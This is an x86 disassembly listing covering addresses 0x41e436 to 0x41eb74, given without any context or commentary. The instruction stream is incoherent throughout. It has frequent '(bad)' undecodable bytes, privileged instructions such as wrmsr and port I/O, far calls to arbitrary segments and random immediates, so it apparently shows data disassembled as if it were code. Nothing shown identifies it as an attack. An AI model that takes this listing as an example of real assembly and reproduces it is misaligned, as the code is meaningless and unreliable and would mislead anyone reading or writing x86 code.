  41e436:	bound  ebx,QWORD PTR [esi-0x7e]
  41e439:	fisubr DWORD PTR [ebp-0x3e]
  41e43c:	int3   
  41e43d:	xor    bl,BYTE PTR [ecx+0x76]
  41e440:	and    DWORD PTR [esi-0x7940c1a1],edi
  41e446:	mov    al,ds:0x98df1677
  41e44b:	inc    ecx
  41e44c:	ret    0x6068
  41e44f:	mov    bl,0x5d
  41e451:	push   cs
  41e452:	push   0xffffffdc
  41e454:	(bad)  
  41e455:	xlat   BYTE PTR ds:[ebx]
  41e456:	(bad)  
  41e457:	push   ebp
  41e458:	jle    0x41e4cf
  41e45a:	in     al,dx
  41e45b:	inc    ebx
  41e45c:	sub    al,BYTE PTR [edx]
  41e45e:	push   es
  41e45f:	dec    esp
  41e460:	xchg   ebx,eax
  41e461:	dec    esp
  41e462:	push   0xffffffa6
  41e464:	or     dh,BYTE PTR [ebx+ebx*8-0x36]
  41e468:	sahf   
  41e469:	(bad)  
  41e46a:	xchg   edi,eax
  41e46b:	loope  0x41e420
  41e46d:	in     al,0x26
  41e46f:	add    BYTE PTR [ebp+0xca1027e],dl
  41e475:	mov    WORD PTR [edx-0x5d],ds
  41e478:	xchg   esp,eax
  41e479:	mov    ds:0x658368a8,al
  41e47e:	inc    eax
  41e47f:	sbb    eax,0xa2bc01cb
  41e484:	std    
  41e485:	pop    ss
  41e486:	bound  eax,QWORD PTR [esi]
  41e488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e489:	push   ebx
  41e48a:	fs fcmovne st,st(2)
  41e48d:	inc    edi
  41e48e:	cwde   
  41e48f:	cmp    dl,BYTE PTR [ecx]
  41e491:	lahf   
  41e492:	cmp    ecx,DWORD PTR [ecx+0x276ceaf3]
  41e498:	ja     0x41e46e
  41e49a:	xchg   edx,eax
  41e49b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e49c:	add    eax,0x6eae718c
  41e4a1:	jnp    0x41e4d1
  41e4a3:	retf   
  41e4a4:	iret   
  41e4a5:	xor    DWORD PTR [esi],edi
  41e4a7:	and    ch,ah
  41e4a9:	aaa    
  41e4aa:	pop    ebx
  41e4ab:	fiadd  WORD PTR [bp+si+0x2865]
  41e4b0:	and    al,0x80
  41e4b2:	ins    DWORD PTR es:[edi],dx
  41e4b3:	cdq    
  41e4b4:	jmp    0x58ba7116
  41e4b9:	fst    DWORD PTR [eax+0x40a70738]
  41e4bf:	cld    
  41e4c0:	or     BYTE PTR [esp+ebx*4+0x58290add],dh
  41e4c7:	out    dx,eax
  41e4c8:	mov    ecx,0xcc2664df
  41e4cd:	jae    0x41e51f
  41e4cf:	test   eax,0x2312180d
  41e4d4:	jbe    0x41e51c
  41e4d6:	pushf  
  41e4d7:	and    edi,DWORD PTR [eax]
  41e4d9:	pop    ebp
  41e4da:	mov    al,ds:0xb51cc3c2
  41e4df:	scas   eax,DWORD PTR es:[edi]
  41e4e0:	fldcw  WORD PTR [ecx-0x32]
  41e4e3:	ins    BYTE PTR es:[edi],dx
  41e4e4:	(bad)  
  41e4e5:	cld    
  41e4e6:	mov    bh,0xe6
  41e4e8:	jle    0x41e4fb
  41e4ea:	sub    esi,DWORD PTR [edx]
  41e4ec:	loop   0x41e48a
  41e4ee:	cmp    ebp,ecx
  41e4f0:	jbe    0x41e559
  41e4f2:	jmp    0xec79bce8
  41e4f7:	fldenv [ecx+0x48fc9839]
  41e4fd:	sbb    edi,ebx
  41e4ff:	fcom   DWORD PTR [ecx-0x34]
  41e502:	add    al,0xa5
  41e504:	cmp    DWORD PTR ds:0xf5409660,ebp
  41e50a:	cmp    bl,BYTE PTR [ebx]
  41e50c:	cli    
  41e50d:	wrmsr  
  41e50f:	cmc    
  41e510:	jnp    0x41e517
  41e512:	aas    
  41e513:	ss jb  0x41e4eb
  41e516:	in     al,0x4a
  41e518:	add    al,0xb2
  41e51a:	ins    DWORD PTR es:[edi],dx
  41e51b:	into   
  41e51c:	mov    ds:0xf14dc892,al
  41e521:	xchg   DWORD PTR [edi],esp
  41e523:	adc    BYTE PTR [esi-0x22ccf4f0],0xe2
  41e52a:	xchg   BYTE PTR [edi+0xd],ah
  41e52d:	(bad)  
  41e52e:	popf   
  41e52f:	jne    0x41e531
  41e531:	push   ebp
  41e532:	jmp    0xfd22b42a
  41e537:	iret   
  41e538:	xchg   esp,eax
  41e539:	push   ss
  41e53a:	push   cs
  41e53b:	add    DWORD PTR [eax+0x9],0x79
  41e53f:	cdq    
  41e540:	jge    0x41e5ad
  41e542:	rcr    DWORD PTR [edi+0x0],1
  41e545:	push   es
  41e546:	jmp    0x41e54f
  41e548:	sbb    BYTE PTR [eax-0x12],ch
  41e54b:	neg    ah
  41e54d:	jmp    0xf253d755
  41e552:	std    
  41e553:	repnz aam 0x47
  41e556:	push   ecx
  41e557:	add    al,BYTE PTR [edx]
  41e559:	mov    ebp,DWORD PTR [ebx-0x10]
  41e55c:	mov    ch,al
  41e55e:	pop    esi
  41e55f:	cmp    al,0x9f
  41e561:	inc    edx
  41e562:	jbe    0x41e573
  41e564:	dec    ebx
  41e565:	mov    bh,0xce
  41e567:	icebp  
  41e568:	ja     0x41e552
  41e56a:	lahf   
  41e56b:	jl     0x41e543
  41e56d:	or     esp,edx
  41e56f:	das    
  41e570:	sub    BYTE PTR [esi+edx*2],dh
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	mov    ds:0x86704a14,al
  41e579:	xchg   ebx,eax
  41e57a:	hlt    
  41e57b:	ret    0x55d8
  41e57e:	pop    edi
  41e57f:	daa    
  41e580:	jae    0x41e5ae
  41e582:	inc    edi
  41e583:	fcom   DWORD PTR [esi+0x21]
  41e586:	in     al,dx
  41e587:	aam    0xed
  41e589:	cmovbe esi,esi
  41e58c:	stos   BYTE PTR es:[edi],al
  41e58d:	dec    edx
  41e58e:	jnp    0x41e51f
  41e590:	aam    0x33
  41e592:	test   al,0xc9
  41e594:	inc    esp
  41e595:	sub    al,0x96
  41e597:	sub    al,BYTE PTR [edx]
  41e599:	mov    bh,0x4b
  41e59b:	push   ebx
  41e59c:	xor    eax,0xae662a17
  41e5a1:	sbb    al,0xd8
  41e5a3:	jg     0x41e5dc
  41e5a5:	xor    BYTE PTR [edx-0x2dddb8b8],dh
  41e5ab:	sbb    ah,dl
  41e5ad:	retf   0x47e8
  41e5b0:	adc    ecx,DWORD PTR ds:0x6610e08b
  41e5b6:	mov    ch,BYTE PTR [ebx-0x7f54a1d3]
  41e5bc:	loope  0x41e556
  41e5be:	inc    esp
  41e5bf:	into   
  41e5c0:	fnstcw WORD PTR [esi+ecx*8]
  41e5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5c4:	fwait
  41e5c5:	jl     0x41e5d6
  41e5c7:	push   0x7218be35
  41e5cc:	icebp  
  41e5cd:	scas   al,BYTE PTR es:[edi]
  41e5ce:	in     eax,dx
  41e5cf:	xchg   DWORD PTR [eax+0x43b358f3],ebp
  41e5d5:	push   es
  41e5d6:	pop    eax
  41e5d8:	mov    esi,0xf94b319b
  41e5dd:	xchg   esp,eax
  41e5de:	dec    edx
  41e5df:	out    dx,eax
  41e5e0:	adc    al,0x3c
  41e5e2:	mov    ecx,0xbcf6ea51
  41e5e7:	mov    ecx,0xa93e2459
  41e5ec:	cwde   
  41e5ed:	jecxz  0x41e650
  41e5ef:	pop    ebp
  41e5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5f1:	add    BYTE PTR [edx+0x7e],0x7f
  41e5f5:	bound  esi,QWORD PTR [ebx+0x1e]
  41e5f8:	adc    ecx,DWORD PTR [ebp-0x358b06b9]
  41e5fe:	or     edx,DWORD PTR [eax+edx*8+0x4b8107ea]
  41e605:	leave  
  41e606:	mov    esp,0xd8131224
  41e60b:	loopne 0x41e591
  41e60d:	(bad)  
  41e60e:	sub    edx,DWORD PTR [ebp-0x57bbea86]
  41e614:	sbb    ecx,esp
  41e616:	shr    DWORD PTR ds:0x13d4f697,1
  41e61c:	xor    esp,DWORD PTR [eax+0x13]
  41e61f:	mov    cl,0x4e
  41e621:	(bad)
  41e625:	push   ds
  41e626:	sub    bl,BYTE PTR [esi+0x3d82bd90]
  41e62c:	out    dx,al
  41e62d:	adc    BYTE PTR ds:0xcf97345a,al
  41e633:	inc    edi
  41e635:	mov    bl,0xb1
  41e637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e638:	test   DWORD PTR [ecx+0x24],eax
  41e63b:	mov    bl,0xdb
  41e63d:	sbb    eax,0xfad6a920
  41e642:	mov    edi,0xd2efb0fd
  41e647:	sub    BYTE PTR [ebx+0x47],bl
  41e64a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e64b:	out    dx,al
  41e64c:	leave  
  41e64d:	push   esi
  41e64e:	push   ebp
  41e64f:	adc    esi,DWORD PTR [ecx-0x6b5aca2]
  41e655:	cdq    
  41e656:	loopne 0x41e60e
  41e658:	sbb    eax,0x752ddc21
  41e65d:	arpl   WORD PTR [esi+0x29664ced],di
  41e663:	mov    esi,eax
  41e665:	sbb    eax,0x16f70096
  41e66a:	push   esp
  41e66b:	aas    
  41e66c:	data16 jnp 0x41e6c3
  41e66f:	mov    al,0x47
  41e671:	or     BYTE PTR [ebp+ebx*4+0xc],ch
  41e675:	inc    esi
  41e676:	les    edx,FWORD PTR [edx-0x24]
  41e679:	sbb    eax,DWORD PTR [edi]
  41e67b:	ins    BYTE PTR es:[edi],dx
  41e67c:	xlat   BYTE PTR ds:[ebx]
  41e67d:	(bad)  
  41e67e:	cli    
  41e67f:	jne    0x41e6fd
  41e681:	xchg   BYTE PTR [edi+0x15],ch
  41e684:	push   ds
  41e685:	imul   edi,DWORD PTR [ebx-0x14],0xa937c8f9
  41e68c:	or     ebx,esp
  41e68e:	fimul  WORD PTR [edx]
  41e690:	cmp    al,0x27
  41e692:	xchg   edx,eax
  41e693:	or     al,0xd9
  41e695:	xor    al,0x94
  41e697:	aad    0x7e
  41e699:	popf   
  41e69a:	clc    
  41e69b:	sbb    bh,BYTE PTR [ecx+0x31b85ebd]
  41e6a1:	mov    edi,ecx
  41e6a3:	ficom  WORD PTR [edx+edi*1]
  41e6a6:	push   ss
  41e6a7:	sti    
  41e6a8:	std    
  41e6a9:	xchg   BYTE PTR [esi+0x5b],dl
  41e6ac:	jae    0x41e659
  41e6ae:	pop    ss
  41e6af:	enter  0x3600,0x85
  41e6b3:	aas    
  41e6b4:	dec    ecx
  41e6b5:	jge    0x41e6b4
  41e6b7:	cmp    al,0x4c
  41e6b9:	rcl    bh,0x22
  41e6bc:	dec    ecx
  41e6bd:	in     al,dx
  41e6be:	leave  
  41e6bf:	xor    BYTE PTR [esp+eiz*2-0x5e],cl
  41e6c3:	stos   DWORD PTR es:[edi],eax
  41e6c4:	sbb    eax,0x1bb9cef4
  41e6c9:	xchg   edi,eax
  41e6ca:	jno    0x41e669
  41e6cc:	jnp    0x41e6f4
  41e6ce:	and    eax,0xc747d3e8
  41e6d3:	add    esi,DWORD PTR [edx-0x4c]
  41e6d6:	cmp    eax,0x9ef6d1a
  41e6db:	mov    eax,ds:0xbd12be53
  41e6e0:	or     DWORD PTR [esi],eax
  41e6e2:	and    al,0xe1
  41e6e4:	mov    ebx,0x37eee2de
  41e6e9:	mov    ebp,0xcc186ab7
  41e6ee:	(bad)  [esp+ebx*4]
  41e6f1:	jo     0x41e717
  41e6f3:	daa    
  41e6f4:	sbb    eax,0x1adb4145
  41e6f9:	mov    ebp,DWORD PTR [ecx-0x77]
  41e6fc:	cld    
  41e6fd:	adc    edi,DWORD PTR [eax-0x62]
  41e700:	out    dx,eax
  41e701:	adc    DWORD PTR [esp+ebp*1],esi
  41e704:	and    DWORD PTR [ebx-0x2beb0f55],ebx
  41e70a:	sbb    al,0xee
  41e70c:	jle    0x41e6f7
  41e70e:	inc    ebp
  41e70f:	push   ecx
  41e710:	xor    al,0x3d
  41e712:	mov    al,ds:0x8b21c02b
  41e717:	xor    BYTE PTR [edx-0x48],bh
  41e71a:	fs loop 0x41e77e
  41e71d:	lock mov esi,DWORD PTR [eax+0x2d]
  41e721:	in     al,dx
  41e722:	add    eax,0xe382fb51
  41e727:	xor    edx,eax
  41e729:	xlat   BYTE PTR ds:[ebx]
  41e72a:	outs   dx,DWORD PTR ds:[esi]
  41e72b:	arpl   WORD PTR [ebp-0x58],bx
  41e72e:	pusha  
  41e72f:	retf   0xea3c
  41e732:	sbb    eax,0xc9693ca
  41e737:	pop    ebp
  41e738:	jecxz  0x41e6fa
  41e73a:	push   eax
  41e73b:	sbb    BYTE PTR [edi-0x7b],bh
  41e73e:	aam    0x9b
  41e740:	test   BYTE PTR [eax-0x13a22a22],0x46
  41e747:	mov    eax,DWORD PTR [edx]
  41e749:	sub    dl,BYTE PTR [ebx-0x535e2f22]
  41e74f:	punpcklwd mm6,mm5
  41e752:	pusha  
  41e753:	and    al,0xce
  41e755:	push   esp
  41e756:	adc    dh,BYTE PTR ss:[edx]
  41e759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e75a:	inc    esp
  41e75b:	and    eax,0x4c4e274
  41e760:	push   esi
  41e761:	jne    0x41e7c3
  41e763:	mov    esp,0x2cc2df1d
  41e768:	add    BYTE PTR [edx+0x4759bb1c],bh
  41e76e:	pop    ebp
  41e76f:	stos   DWORD PTR es:[edi],eax
  41e770:	addr16 inc ebx
  41e772:	sub    eax,edi
  41e774:	mov    ah,0x8b
  41e776:	sub    BYTE PTR [esi-0x47],bl
  41e779:	mov    esp,0xbd3cffcd
  41e77e:	sub    DWORD PTR [edi+0x74c14c3b],edx
  41e784:	pop    ds
  41e785:	ss shl cl,cl
  41e788:	fld    TBYTE PTR [edi+0x60]
  41e78b:	into   
  41e78c:	arpl   si,di
  41e78e:	adc    BYTE PTR [eax-0x462ed040],dl
  41e794:	retf   
  41e795:	fdivr  st(2),st
  41e797:	and    BYTE PTR [ebp+0x23],0x8b
  41e79b:	(bad)  
  41e79c:	std    
  41e79d:	push   ds
  41e79e:	das    
  41e79f:	push   eax
  41e7a0:	outs   dx,BYTE PTR ds:[esi]
  41e7a1:	xor    ebx,DWORD PTR [ebx+edx*2+0x415e11ab]
  41e7a8:	push   0x2f
  41e7aa:	push   esp
  41e7ab:	push   ecx
  41e7ac:	nop
  41e7ad:	pop    ds
  41e7ae:	test   eax,0x526918ec
  41e7b3:	cmp    esp,DWORD PTR [ecx]
  41e7b5:	pop    edi
  41e7b6:	cli    
  41e7b7:	cmp    BYTE PTR [eax-0x1c81f98d],bl
  41e7bd:	mov    ah,0x94
  41e7bf:	xchg   esi,eax
  41e7c0:	push   ecx
  41e7c1:	mov    ds:0xc32394b8,eax
  41e7c6:	clc    
  41e7c7:	sahf   
  41e7c8:	cwde   
  41e7c9:	jge    0x41e7dc
  41e7cb:	mov    esi,0x476daba0
  41e7d0:	push   eax
  41e7d1:	loop   0x41e7d2
  41e7d3:	aam    0xfd
  41e7d5:	xchg   edx,eax
  41e7d6:	and    al,0xbf
  41e7d8:	and    BYTE PTR [esi+ecx*4],0x10
  41e7dc:	test   BYTE PTR [ebp+0x5b],dh
  41e7df:	test   al,0x3f
  41e7e1:	xor    eax,0x56ca6aa0
  41e7e6:	cmp    al,0x91
  41e7e8:	in     eax,0x1b
  41e7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7eb:	adc    eax,0x4dd4f968
  41e7f0:	add    BYTE PTR [edx],ah
  41e7f2:	lds    esp,FWORD PTR [edx]
  41e7f4:	fsub   DWORD PTR [ebx+0x317656e]
  41e7fa:	das    
  41e7fb:	mov    edx,0x9b635e35
  41e800:	mov    al,ds:0x950a7e25
  41e805:	or     edx,eax
  41e807:	fmulp  st(1),st
  41e809:	repz mov bl,0x20
  41e80c:	sbb    cl,BYTE PTR [eax+esi*8-0x44]
  41e810:	aaa    
  41e811:	jecxz  0x41e887
  41e813:	add    eax,DWORD PTR [edx-0xeaa10b3]
  41e819:	mov    bl,0x52
  41e81b:	sub    DWORD PTR [ecx-0x1c],0x9e0cd015
  41e822:	mov    ss,ebp
  41e824:	pop    es
  41e825:	cmp    DWORD PTR [esi+0x79adf041],esi
  41e82b:	dec    ebp
  41e82c:	add    eax,0xc30ca3a8
  41e831:	mov    cl,0x8e
  41e833:	jbe    0x41e85d
  41e835:	aas    
  41e836:	mov    bl,0x83
  41e838:	imul   esi,eax,0xffffff91
  41e83b:	jp     0x41e884
  41e83d:	repz arpl WORD PTR [ebx-0x6e04ddb3],si
  41e844:	inc    eax
  41e845:	inc    edi
  41e846:	inc    eax
  41e847:	fwait
  41e848:	mov    esp,0x7473c2bc
  41e84d:	jno    0x41e82d
  41e84f:	stc    
  41e850:	mov    ds:0x2c79ea81,al
  41e855:	imul   eax,edx,0xeb3a8b2a
  41e85b:	jb     0x41e853
  41e85d:	or     al,0x8d
  41e85f:	mov    DWORD PTR [ebp-0x5665424f],eax
  41e865:	pop    ss
  41e866:	daa    
  41e867:	inc    esp
  41e868:	sti    
  41e869:	dec    esp
  41e86a:	inc    edi
  41e86b:	cld    
  41e86c:	nop
  41e86d:	inc    edi
  41e86e:	sbb    BYTE PTR [ebp+0x23ba2ce7],0x59
  41e875:	dec    edx
  41e876:	adc    ebx,DWORD PTR [esi-0x74]
  41e879:	call   0x66dc05ae
  41e87e:	addr16 pop esi
  41e880:	inc    ebx
  41e881:	adc    cl,BYTE PTR [esi]
  41e883:	cmp    al,al
  41e885:	or     BYTE PTR [edx],dh
  41e887:	test   al,0xec
  41e889:	inc    edi
  41e88a:	lods   al,BYTE PTR ds:[esi]
  41e88b:	dec    BYTE PTR [esi]
  41e88d:	push   ebx
  41e88e:	into   
  41e88f:	dec    ecx
  41e890:	(bad)  
  41e891:	sbb    BYTE PTR ds:0x8337c8c4,ah
  41e897:	lea    esi,[ecx]
  41e899:	loope  0x41e828
  41e89b:	xchg   ecx,eax
  41e89c:	into   
  41e89d:	(bad)  
  41e89e:	test   eax,0xf085e3c2
  41e8a3:	es mov ah,0xe
  41e8a6:	and    dh,BYTE PTR [ebx+0x65502893]
  41e8ac:	loope  0x41e869
  41e8ae:	hlt    
  41e8af:	stos   DWORD PTR es:[edi],eax
  41e8b0:	jo     0x41e87a
  41e8b2:	ins    DWORD PTR es:[edi],dx
  41e8b3:	xor    dh,bh
  41e8b5:	sbb    BYTE PTR [esi+ecx*8-0x25],cl
  41e8b9:	jp     0x41e87e
  41e8bb:	fistp  QWORD PTR [ecx-0x5e]
  41e8be:	rcr    BYTE PTR [eax],0x8f
  41e8c1:	out    dx,eax
  41e8c2:	mov    bh,0xf4
  41e8c4:	leave  
  41e8c5:	cmp    BYTE PTR [ebp-0x56],al
  41e8c8:	popa   
  41e8c9:	xchg   edi,eax
  41e8ca:	and    al,0xe2
  41e8cc:	xor    al,0x30
  41e8ce:	mov    ebx,0x7d3b22f8
  41e8d3:	je     0x41e894
  41e8d5:	jbe    0x41e882
  41e8d7:	test   DWORD PTR [esi],ecx
  41e8d9:	pop    esi
  41e8da:	xchg   esi,eax
  41e8db:	xchg   esi,eax
  41e8dc:	les    edi,FWORD PTR [eax]
  41e8de:	mov    ds:0xe852afe8,ax
  41e8e4:	cs inc edx
  41e8e6:	aad    0x73
  41e8e8:	(bad)  
  41e8e9:	push   esp
  41e8ea:	repnz mov dl,0xa5
  41e8ed:	ins    BYTE PTR es:[edi],dx
  41e8ee:	push   edi
  41e8ef:	mov    cl,BYTE PTR [ecx]
  41e8f1:	bnd es ds je 0x41e8d7
  41e8f6:	inc    ecx
  41e8f8:	pop    ecx
  41e8f9:	nop
  41e8fa:	jmp    DWORD PTR [ebx-0x1c]
  41e8fd:	adc    DWORD PTR [ebx-0x42],esi
  41e900:	dec    eax
  41e901:	cmp    bl,BYTE PTR [ecx]
  41e903:	xor    ch,BYTE PTR [edx]
  41e905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e906:	iret   
  41e907:	cdq    
  41e908:	loopne 0x41e8a4
  41e90a:	inc    edi
  41e90b:	ins    BYTE PTR es:[edi],dx
  41e90c:	xor    eax,0x4315339f
  41e911:	fsubr  QWORD PTR [ecx+0x62]
  41e914:	repz or DWORD PTR [eax-0x78],edi
  41e918:	pop    esp
  41e919:	xchg   ebp,eax
  41e91a:	hlt    
  41e91b:	adc    edi,DWORD PTR [eax]
  41e91d:	bound  edx,QWORD PTR [ecx+edi*4-0x3546b25]
  41e924:	cmp    al,0xd5
  41e926:	mov    al,ds:0xafa0b3d3
  41e92b:	xchg   ebx,eax
  41e92c:	aaa    
  41e92d:	jecxz  0x41e8b8
  41e92f:	repnz adc ah,bl
  41e932:	adc    eax,0xe4786219
  41e937:	call   0x25b5:0x11ac313f
  41e93e:	retf   
  41e93f:	fwait
  41e940:	sub    eax,0x4fc4784a
  41e945:	inc    ebx
  41e946:	jle    0x41e9a6
  41e948:	mov    ecx,0x96c60e0
  41e94d:	mov    gs,WORD PTR [ebx]
  41e94f:	dec    edi
  41e950:	out    0x37,al
  41e952:	sub    edx,DWORD PTR [edx]
  41e954:	cs call 0x4caf0e74
  41e95a:	mov    eax,0x9ba590e5
  41e95f:	dec    ebx
  41e960:	inc    BYTE PTR [edi+0x7eedac99]
  41e966:	lahf   
  41e967:	(bad)  
  41e968:	xchg   edi,eax
  41e969:	pop    ecx
  41e96a:	jmp    0x1875:0x329eca4f
  41e971:	in     eax,0xd3
  41e973:	mov    ecx,0x1e4d2b3a
  41e978:	cwde   
  41e979:	jnp    0x41e9b3
  41e97b:	addr16 inc edx
  41e97d:	jmp    esp
  41e97f:	and    eax,0xf9c30356
  41e984:	sub    eax,0xadefcad0
  41e989:	or     al,0xeb
  41e98b:	or     eax,0x2320a597
  41e990:	test   BYTE PTR [esp+eax*4-0x5c999c63],bh
  41e997:	push   0xffffffa9
  41e999:	lahf   
  41e99a:	jno    0x41e941
  41e99c:	add    ebp,DWORD PTR [ecx]
  41e99e:	jp     0x41e969
  41e9a0:	into   
  41e9a1:	mov    edi,0x292e7b04
  41e9a6:	(bad)  
  41e9a7:	ss cdq 
  41e9a9:	dec    eax
  41e9aa:	mov    ecx,0x6ad09da6
  41e9af:	or     esi,DWORD PTR [ebx-0x5aa88979]
  41e9b5:	adc    dh,BYTE PTR [eiz*4-0x214cfeba]
  41e9bc:	shl    DWORD PTR [edi],0xe6
  41e9bf:	loop   0x41e965
  41e9c1:	pop    ss
  41e9c2:	mov    ah,0x66
  41e9c4:	jle    0x41e9bf
  41e9c6:	shr    DWORD PTR [ebp+0x45],1
  41e9c9:	push   edi
  41e9ca:	call   DWORD PTR [eax+0x52]
  41e9cd:	lods   al,BYTE PTR ds:[esi]
  41e9cf:	aas    
  41e9d0:	jne    0x41ea2e
  41e9d2:	call   0xa40a00d4
  41e9d7:	push   eax
  41e9d8:	cmp    BYTE PTR [esi+0x42],al
  41e9db:	mov    esi,0x661c6b29
  41e9e0:	stc    
  41e9e1:	imul   edx,DWORD PTR [ebp-0x2bee77e],0xdfc215a
  41e9eb:	rol    BYTE PTR [ebx+0x0],1
  41e9ee:	dec    esp
  41e9ef:	dec    ebp
  41e9f0:	js     0x41ea08
  41e9f2:	out    dx,eax
  41e9f3:	in     al,0x9a
  41e9f5:	pop    ss
  41e9f6:	gs retf 0x69cf
  41e9fa:	mov    bl,0x63
  41e9fc:	pushf  
  41e9fd:	pop    ecx
  41e9fe:	pusha  
  41e9ff:	push   ss
  41ea00:	nop
  41ea01:	mov    dh,0xe2
  41ea03:	pusha  
  41ea04:	mov    bh,0x33
  41ea06:	mov    esp,0xbd150690
  41ea0b:	aaa    
  41ea0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea0d:	jne    0x41e9b4
  41ea0f:	ret    
  41ea10:	mov    dl,0x6e
  41ea12:	mov    ebx,0x3119f58c
  41ea17:	test   eax,0x340bd1aa
  41ea1c:	ins    BYTE PTR es:[edi],dx
  41ea1d:	xchg   esp,eax
  41ea1e:	mov    dl,0x41
  41ea20:	xor    BYTE PTR [edx],bl
  41ea22:	rcr    BYTE PTR [ebx],cl
  41ea24:	shl    DWORD PTR ds:0x1f328bfa,cl
  41ea2a:	(bad)  
  41ea2b:	call   0x299a:0x3d154ad7
  41ea32:	dec    ecx
  41ea33:	mov    bh,al
  41ea35:	clc    
  41ea36:	xor    ch,bh
  41ea38:	mov    ds:0x1ff0ea28,al
  41ea3d:	push   ebx
  41ea3e:	inc    esi
  41ea3f:	addr16 inc esp
  41ea41:	xor    BYTE PTR [eax],ch
  41ea43:	int3   
  41ea44:	adc    ah,ah
  41ea46:	shl    BYTE PTR [ebx+0x38],cl
  41ea49:	xchg   ecx,eax
  41ea4b:	ins    DWORD PTR es:[edi],dx
  41ea4c:	and    eax,0x9549fdbf
  41ea51:	mov    esi,0x663a324a
  41ea56:	out    dx,al
  41ea57:	loop   0x41ea13
  41ea59:	add    BYTE PTR [ebx-0x38],ch
  41ea5c:	lea    edx,[esi-0x4fb3865]
  41ea62:	xlat   BYTE PTR ds:[ebx]
  41ea63:	dec    edx
  41ea64:	fisubr WORD PTR [edx-0x20d9a576]
  41ea6a:	and    ah,BYTE PTR [eax-0x3ebd6361]
  41ea70:	cmp    al,0xd0
  41ea72:	sub    edi,DWORD PTR [edi+0x36e54523]
  41ea78:	mov    bh,0x51
  41ea7a:	sbb    edx,esp
  41ea7c:	mov    dl,0x1e
  41ea7e:	scas   eax,DWORD PTR es:[edi]
  41ea7f:	shr    DWORD PTR [ebx],1
  41ea81:	iret   
  41ea82:	push   0xb9639886
  41ea87:	jno    0x41eab0
  41ea89:	aaa    
  41ea8a:	call   0x9f32:0xf7820ba8
  41ea91:	test   eax,0x7cd8d08e
  41ea96:	and    eax,0x967e36
  41ea9b:	fld    TBYTE PTR [ecx]
  41ea9d:	lods   al,BYTE PTR ds:[esi]
  41ea9e:	repnz in eax,dx
  41eaa0:	xchg   esi,eax
  41eaa1:	ror    ecx,0xcc
  41eaa4:	dec    esp
  41eaa5:	mov    esi,0x1e96affa
  41eaaa:	cld    
  41eaab:	cmp    DWORD PTR [esi],esi
  41eaad:	push   edx
  41eaae:	(bad)  
  41eaaf:	lods   al,BYTE PTR ds:[esi]
  41eab0:	mov    edx,0x1e3d9b20
  41eab5:	xlat   BYTE PTR ds:[ebx]
  41eab6:	xchg   ah,ah
  41eab8:	inc    esp
  41eab9:	das    
  41eaba:	lea    edx,[esi-0x2d]
  41eabd:	inc    eax
  41eabe:	popf   
  41eabf:	test   al,0xe1
  41eac1:	scas   eax,DWORD PTR es:[edi]
  41eac2:	cwde   
  41eac3:	mov    ecx,0x7cd51e10
  41eac8:	cmp    esi,DWORD PTR [ecx+0x41]
  41eacb:	xchg   ecx,eax
  41eacc:	jl     0x41eac7
  41eace:	dec    ebx
  41eacf:	jl     0x41eaf5
  41ead1:	fld    QWORD PTR [edi+0xa]
  41ead4:	sbb    eax,0xa492cbe2
  41ead9:	push   eax
  41eada:	pop    esp
  41eadb:	pusha  
  41eadc:	pop    ss
  41eadd:	dec    BYTE PTR [edi]
  41eadf:	(bad)  
  41eae0:	ja     0x41eb28
  41eae2:	jmp    0x374337e6
  41eae7:	xor    bl,BYTE PTR ds:[edi]
  41eaea:	dec    esi
  41eaeb:	stos   DWORD PTR es:[edi],eax
  41eaec:	in     eax,0x95
  41eaee:	adc    DWORD PTR [ebp-0x23],0x469b12cf
  41eaf5:	into   
  41eaf6:	or     cl,BYTE PTR [esi]
  41eaf8:	(bad)  
  41eaf9:	pop    ds
  41eafa:	int3   
  41eafb:	(bad)  
  41eafd:	daa    
  41eafe:	mov    ah,0xfa
  41eb00:	dec    esp
  41eb01:	(bad)
  41eb04:	xchg   esp,eax
  41eb05:	mov    ds:0xe0b7556f,eax
  41eb0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb0b:	mov    bl,0xf6
  41eb0d:	dec    esi
  41eb0e:	xchg   esi,eax
  41eb0f:	xchg   esp,eax
  41eb10:	lds    esp,FWORD PTR [ecx+0x77]
  41eb13:	icebp  
  41eb14:	popf   
  41eb15:	mov    eax,0x2d01c333
  41eb1a:	inc    edx
  41eb1b:	cmp    BYTE PTR [ebx],ch
  41eb1d:	int    0xd6
  41eb1f:	xchg   BYTE PTR [ecx-0x4e],al
  41eb22:	outs   dx,DWORD PTR ds:[esi]
  41eb23:	push   ecx
  41eb24:	pop    ebx
  41eb25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb26:	stos   BYTE PTR es:[edi],al
  41eb27:	clc    
  41eb28:	pop    eax
  41eb29:	cmp    DWORD PTR [eax-0x5f],edx
  41eb2c:	inc    edx
  41eb2d:	and    BYTE PTR [eax-0x151e44bc],ch
  41eb33:	scas   al,BYTE PTR es:[edi]
  41eb34:	loop   0x41eae6
  41eb36:	fsubr  DWORD PTR [edi-0x35]
  41eb39:	out    dx,eax
  41eb3a:	ror    BYTE PTR [esi+0x29],0x99
  41eb3e:	adc    DWORD PTR [esi],esi
  41eb40:	jmp    0x41eb4d
  41eb42:	in     eax,0x40
  41eb44:	xor    dh,BYTE PTR [edx-0x75]
  41eb47:	fwait
  41eb48:	or     al,0x2e
  41eb4a:	cmp    eax,DWORD PTR [ebp+0x3e440983]
  41eb50:	push   0xac11abd1
  41eb55:	retf   
  41eb56:	js     0x41eba2
  41eb58:	call   0x9c6:0x505edf9b
  41eb5f:	mov    edx,0xf8717e3c
  41eb64:	sbb    eax,0x6c7a8c31
  41eb69:	push   ecx
  41eb6a:	dec    ebx
  41eb6b:	jno    0x41eafe
  41eb6d:	icebp  
  41eb6e:	shl    DWORD PTR ds:0x6501508e,1
  41eb74:	jecxz  0x41eafc
